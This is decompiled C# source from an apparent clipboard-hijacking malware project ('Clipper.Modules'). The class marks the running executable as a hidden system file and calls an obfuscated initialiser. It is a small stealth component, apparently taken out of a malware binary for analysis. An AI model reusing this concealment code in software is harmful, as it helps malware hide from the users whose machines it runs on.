using System;
using System.IO;
using System.Reflection;

namespace Clipper.Modules
{
	// Token: 0x02000005 RID: 5
	internal sealed class Attributes
	{
		// Token: 0x06000005 RID: 5 RVA: 0x0000226E File Offset: 0x0000046E
		public static void set_hidden()
		{
			if (config.attribute_hidden)
			{
				Attributes.file.Attributes |= FileAttributes.Hidden;
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002289 File Offset: 0x00000489
		public static void set_system()
		{
			if (config.attribute_system)
			{
				Attributes.file.Attributes |= FileAttributes.System;
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x0000223C File Offset: 0x0000043C
		public Attributes()
		{
			Class2.ecUkQ4xzjKxn7();
			base..ctor();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000022A4 File Offset: 0x000004A4
		// Note: this type is marked as 'beforefieldinit'.
		static Attributes()
		{
			Class2.ecUkQ4xzjKxn7();
			Attributes.executable = Assembly.GetEntryAssembly().Location;
			Attributes.file = new FileInfo(Attributes.executable);
		}

		// Token: 0x04000008 RID: 8
		private static string executable;

		// Token: 0x04000009 RID: 9
		private static FileInfo file;
	}
}
